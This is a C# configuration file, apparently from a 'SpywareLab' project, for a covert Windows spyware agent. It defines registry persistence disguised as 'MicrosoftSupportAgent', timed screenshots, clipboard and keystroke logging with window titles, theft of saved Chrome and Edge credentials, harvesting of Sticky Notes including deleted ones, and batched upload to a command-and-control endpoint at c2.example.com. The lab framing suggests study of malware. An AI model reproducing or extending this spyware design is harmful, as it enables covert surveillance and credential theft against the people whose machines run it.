namespace Spyware.Core.Configuration;

public sealed class AgentConfig
{
    public string AgentName { get; set; } = "SpywareAgent";

    /// <summary>Identificador estable del agente. Se genera la primera vez.</summary>
    public string AgentId { get; set; } = string.Empty;

    /// <summary>Semilla del mutex de instancia única.</summary>
    public string MutexSeed { get; set; } = "SpywareLab.SpywareAgent";

    public PersistenceSection Persistence { get; set; } = new();
    public ScreenshotSection Screenshot { get; set; } = new();
    public ClipboardSection Clipboard { get; set; } = new();
    public BrowserSection Browsers { get; set; } = new();
    public KeyboardSection Keyboard { get; set; } = new();
    public NotesSection Notes { get; set; } = new();
    public TransportSection Transport { get; set; } = new();
    public StorageSection Storage { get; set; } = new();
    public LoggingSection Logging { get; set; } = new();

    public static AgentConfig CreateDefault() => new()
    {
        AgentId = Guid.NewGuid().ToString("N"),
        Persistence = new PersistenceSection(),
        Screenshot = new ScreenshotSection(),
        Clipboard = new ClipboardSection(),
        Browsers = new BrowserSection(),
        Keyboard = new KeyboardSection(),
        Notes = new NotesSection(),
        Transport = new TransportSection(),
        Storage = new StorageSection(),
        Logging = new LoggingSection()
    };
}

public sealed class PersistenceSection
{
    public bool Enabled { get; set; } = true;
    public string RegistryValueName { get; set; } = "MicrosoftSupportAgent";
    public bool StartupFolder { get; set; }
}

public sealed class ScreenshotSection
{
    public bool Enabled { get; set; } = true;
    public int IntervalSeconds { get; set; } = 60;
    public int JitterSeconds { get; set; } = 10;
    public int JpegQuality { get; set; } = 75;
    public int MaxWidth { get; set; } = 1280;
    public int MaxHeight { get; set; } = 720;
    public bool SkipDuplicates { get; set; } = true;
    public bool CaptureOnLockedDesktop { get; set; }
}

public sealed class ClipboardSection
{
    public bool Enabled { get; set; } = true;
    public int MaxTextLength { get; set; } = 100_000;
    public bool CaptureImages { get; set; } = true;
    public bool CaptureHtml { get; set; }
    public bool CaptureFiles { get; set; } = true;
    public bool SaveTextCopy { get; set; }
    public int DebounceMilliseconds { get; set; } = 400;
    public bool SkipDuplicates { get; set; } = true;
}

public sealed class BrowserSection
{
    public bool Enabled { get; set; } = true;
    public int IntervalMinutes { get; set; } = 15;
    public int JitterSeconds { get; set; } = 60;
    public bool Chrome { get; set; } = true;
    public bool Edge { get; set; } = true;
    public int MaxResultsPerRun { get; set; } = 1000;

    /// <summary>Guarda el blob cifrado en base64 cuando no se puede descifrar.</summary>
    public bool KeepEncryptedBlob { get; set; } = true;

    /// <summary>No repite en la base la credencial que ya se registró sin cambios.</summary>
    public bool SkipUnchanged { get; set; } = true;

    public bool WriteDumpFile { get; set; }
}

public sealed class KeyboardSection
{
    public bool Enabled { get; set; } = true;

    /// <summary>Pausa sin pulsaciones que cierra la ráfaga y la guarda.</summary>
    public int IdleFlushMilliseconds { get; set; } = 1500;

    /// <summary>Caracteres máximos acumulados antes de cerrar la ráfaga.</summary>
    public int MaxBufferCharacters { get; set; } = 2000;

    /// <summary>Recorta el texto guardado (mismo criterio que el portapapeles).</summary>
    public int MaxTextLength { get; set; } = 100_000;

    /// <summary>Teclas sin glifo escrito: Enter, Tabulador, flechas, F1…F24, Esc…</summary>
    public bool RecordSpecialKeys { get; set; } = true;

    /// <summary>Inserta [pausa Ns] cuando pasan N segundos entre dos pulsaciones de la misma ráfaga.</summary>
    public int GapMarkerSeconds { get; set; } = 30;

    /// <summary>Título de ventana y proceso en primer plano (T1010).</summary>
    public bool RecordWindowTitles { get; set; } = true;

    /// <summary>Retroceso borra el último carácter captado en lugar de anotar la tecla.</summary>
    public bool HonorBackspace { get; set; } = true;

    /// <summary>Copia del texto de la ráfaga en storage\keylog (opcional).</summary>
    public bool SaveTextCopy { get; set; }

    /// <summary>Omite ráfagas cuyo hash coincide con la anterior.</summary>
    public bool SkipDuplicates { get; set; }

    /// <summary>Captura de pantalla al cambiar la ventana en primer plano.</summary>
    public bool CaptureOnFocusChange { get; set; } = true;

    /// <summary>Mínimo de segundos entre dos capturas por cambio de foco.</summary>
    public int FocusCaptureMinimumSeconds { get; set; } = 3;
}

public sealed class NotesSection
{
    public bool Enabled { get; set; } = true;
    public int IntervalMinutes { get; set; } = 15;
    public int JitterSeconds { get; set; } = 60;

    /// <summary>Sticky Notes moderno: plum.sqlite dentro del paquete del almacén.</summary>
    public bool StickyNotes { get; set; } = true;

    /// <summary>Sticky Notes clásico: StickyNotes.snt (formato CFB/OLE).</summary>
    public bool LegacySnt { get; set; } = true;

    /// <summary>Incluye notas marcadas como borradas con estado "deleted".</summary>
    public bool IncludeDeleted { get; set; } = true;

    /// <summary>No repite una nota cuyo hash ya se registró en este ciclo de ejecución.</summary>
    public bool SkipUnchanged { get; set; } = true;

    /// <summary>Copia del texto de cada nota nueva en storage\notes (criterio de teclado y portapapeles).</summary>
    public bool SaveTextCopy { get; set; }

    public int MaxTextLength { get; set; } = 20_000;
    public int MaxResultsPerRun { get; set; } = 200;

    /// <summary>Volcado JSON en claro de las notas leídas (storage\notes).</summary>
    public bool WriteDumpFile { get; set; }

    /// <summary>Ruta alternativa de plum.sqlite para demostraciones (override del paquete).</summary>
    public string? DatabaseOverride { get; set; }

    /// <summary>Ruta alternativa de StickyNotes.snt para demostraciones.</summary>
    public string? LegacyOverride { get; set; }
}

public sealed class TransportSection
{
    public bool Enabled { get; set; } = true;

    /// <summary>"local" (por defecto), "http", "both", "none".</summary>
    public string Mode { get; set; } = "local";

    public int FlushIntervalSeconds { get; set; } = 30;
    public int BatchSize { get; set; } = 25;
    public bool IncludeImagesInExport { get; set; } = true;
    public string? ExportDirectory { get; set; }

    // Opciones de red (opcionales, inactivas con Mode = "local").
    public string Endpoint { get; set; } = "https://c2.example.com/collect";
    public string ApiKey { get; set; } = string.Empty;
    public int TimeoutSeconds { get; set; } = 15;
    public int[] RetryMinutes { get; set; } = { 1, 5, 15 };
    public bool AllowUntrustedTlsCertificate { get; set; }
    public string? ExpectedCertificateThumbprint { get; set; }
}

public sealed class StorageSection
{
    public int MaxDays { get; set; } = 7;
    public int MaxSizeMb { get; set; } = 500;
    public int PruneIntervalMinutes { get; set; } = 60;

    /// <summary>Documentado como false: el requisito es almacenamiento local SIN CIFRAR.</summary>
    public bool EncryptLocalData { get; set; }

    /// <summary>Si es true, borra archivos locales tras exportar (retención corta).</summary>
    public bool DeleteAfterExport { get; set; }
}

public sealed class LoggingSection
{
    public string Level { get; set; } = "Information";
    public int MaxLogFileMb { get; set; } = 5;
    public int MaxLogFiles { get; set; } = 3;
    public bool MirrorToConsole { get; set; }
}
